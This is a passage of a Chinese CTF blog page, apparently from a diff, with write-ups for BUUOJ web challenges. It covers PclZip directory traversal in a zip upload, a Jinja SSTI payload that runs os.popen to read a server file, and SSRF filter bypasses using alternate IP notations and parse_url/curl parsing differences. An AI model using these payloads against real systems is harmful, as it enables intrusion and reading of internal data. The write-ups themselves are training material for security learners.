class="string">&#x27;zip&#x27;</span>)&#123;</span><br><span class="line">            $archive = <span class="keyword">new</span> PclZip($file[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">            <span class="keyword">foreach</span>($archive-&gt;listContent() <span class="keyword">as</span> $value)&#123;</span><br><span class="line">                $filename = $value[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.php$/&#x27;</span>, $filename))&#123;</span><br><span class="line">                     <span class="keyword">exit</span>(<span class="string">&quot;压缩包内不允许含有php文件!&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class="number">0</span>) &#123;</span><br><span class="line">                check_dir($dir);</span><br><span class="line">                   <span class="keyword">exit</span>(<span class="string">&quot;解压失败&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            check_dir($dir);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;上传成功!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], $temp_dir.<span class="string">&#x27;/&#x27;</span>.$file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            check_dir($dir);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;上传成功!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;仅允许上传zip、jpg、gif、png文件!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>核心的点在check_dir这里，我们上下看一眼就知道我们是白名单上传，绕过就别想了，但是他允许我们上传zip，这样的话就有操作的空间了。注意这个函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$archive = <span class="keyword">new</span> PclZip($file[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>这里涉及到了一个trick，该函数是存在目录穿越漏洞的！。也就是说如果我们的文件名为../../xx.php.xx</p>
+<p><strong>就会被上传到其他目录</strong>，这里修改的话需要利用010editor来进行操作</p>
+<p>之后我们可以看见：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($archive-&gt;listContent() <span class="keyword">as</span> $value)&#123;</span><br><span class="line">                $filename = $value[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.php$/&#x27;</span>, $filename))&#123;</span><br><span class="line">                     <span class="keyword">exit</span>(<span class="string">&quot;压缩包内不允许含有php文件!&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑是先解压文件，之后再check，但是利用该漏洞，check的时候文件已经被创建到其他文件夹去了，也就没办法check到了。</p>
+<p>所以我们这里直接上传一个../../xx.php.xxx就行了</p>
+<h1 id="第三章-web进阶-SSTI"><a href="#第三章-web进阶-SSTI" class="headerlink" title="[第三章 web进阶]SSTI"></a>[第三章 web进阶]SSTI</h1><p>简单题目，直接梭就行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5d5ec153-1957-45a2-bff1-fda588f70774.node3.buuoj.cn&#x2F;?password&#x3D;&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat app&#x2F;server.py&#39;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="第三章-web进阶-Python里的SSRF"><a href="#第三章-web进阶-Python里的SSRF" class="headerlink" title="[第三章 web进阶]Python里的SSRF"></a>[第三章 web进阶]Python里的SSRF</h1><p>知识点：</p>
+<p>关于SSRF，其实我也懂得不多..这道题题目给出提示让我们访问</p>
+<p>8000 端口和 url path /api/internal/secret</p>
+<p>这里是看过P牛的文章..</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leavesongs.com&#x2F;PYTHON&#x2F;defend-ssrf-vulnerable-in-python.html</span><br></pre></td></tr></table></figure>
+
+<p>所以我们想要绕过只需要构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95cf0d10-668e-49cc-a0ac-3982c091dd6d.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.233.233.233:8000&#x2F;api&#x2F;internal&#x2F;secret</span><br></pre></td></tr></table></figure>
+
+<p>除此之外，在linux当中0.0.0.0等效于127.0.0.1</p>
+<p>故我们其实也可以构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95cf0d10-668e-49cc-a0ac-3982c091dd6d.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;0.0.0.0:8000&#x2F;api&#x2F;internal&#x2F;secret</span><br></pre></td></tr></table></figure>
+
+<p>还有：</p>
+<ol>
+<li>利用八进制IP地址绕过</li>
+<li>利用十六进制IP地址绕过</li>
+<li>利用十进制的IP地址绕过</li>
+<li>利用IP地址的省略写法绕过</li>
+</ol>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">四种写法（5个例子）：012.0.0.1 、 0xa.0.0.1 、 167772161 、 10.1 、 0xA000001 实际上都请求的是10.0.0.1，但他们一个都匹配不上上述正则表达式。</span><br></pre></td></tr></table></figure>
+
+<p>这里还提供一些ssrf的思路，比如：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误</span><br></pre></td></tr></table></figure>
+
+<p>还有这么一个[xip服务] <a target="_blank" rel="noopener" href="http://xip.io/">http://xip.io</a></p>
+<p>暂且思考到这里：</p>
+<h1 id="第二章-web进阶-SSRF-Training"><a href="#第二章-web进阶-SSRF-Training" class="headerlink" title="[第二章 web进阶]SSRF Training"></a>[第二章 web进阶]SSRF Training</h1><p>呃，就很奇怪？这道题的时候，index.php服务下的容器，可以直接127.0.0.1/flag.php就冲过去了</p>
+<p><img src="image-20201204151421793.png" alt="image-20201204151421793"></p>
+<p>但是还有个challenge.php,这个要难。给出源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match_result=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,$url);</span><br><span class="line">    <span class="keyword">if</span> (!$match_result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $url_parse=parse_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $hostname=$url_parse[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $ip=gethostbyname($hostname);</span><br><span class="line">    $int_ip=ip2long($ip);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $result_info = curl_getinfo($ch);</span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url($result_info[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">    safe_request_url($url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>主要trick在于parse_url和curl的解析会出现差异，当我们构造url为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a@127.0.0.1:80@baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>parse_url会解析后者，拿到手上的就是<a target="_blank" rel="noopener" href="http://baidu.com,而curl实际上发送出去的请求为127.0.0.1/">http://baidu.com,而curl实际上发送出去的请求为127.0.0.1:80</a></p>
+<p>注意一些，如果你需要访问某个页面，你需要添加的payload应该是：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://a@127.0.0.1:80@hacktest.com/flag.php</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-4%E6%B2%A1%E5%95%A5%E5%A5%BD%E8%AF%B4%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">1-4没啥好说的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#arf-2"><span class="toc-number">2.</span> <span class="toc-text">arf_2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A52"><span class="toc-number">3.</span> <span class="toc-text">SQL注入2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#afr-3"><span class="toc-number">4.</span> <span class="toc-text">afr_3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-web%E8%BF%9B%E9%98%B6-%E6%AD%BB%E4%BA%A1ping%E5%91%BD%E4%BB%A4"><span class="toc-number">5.</span> <span class="toc-text">[第二章 web进阶]死亡ping命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-web%E8%BF%9B%E9%98%B6-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.</span> <span class="toc-text">[第二章 web进阶]文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">6.1.</span> <span class="toc-text">知识点：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-apache%E8%87%AA%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.1.1.</span> <span class="toc-text">1.apache自带的文件解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.1.2.</span> <span class="toc-text">2.逻辑漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-web%E8%BF%9B%E9%98%B6-SSTI"><span class="toc-number">7.</span> <span class="toc-text">[第三章 web进阶]SSTI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-web%E8%BF%9B%E9%98%B6-Python%E9%87%8C%E7%9A%84SSRF"><span class="toc-number">8.</span> <span class="toc-text">[第三章 web进阶]Python里的SSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-web%E8%BF%9B%E9%98%B6-SSRF-Training"><span class="toc-number">9.</span> <span class="toc-text">[第二章 web进阶]SSRF Training</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
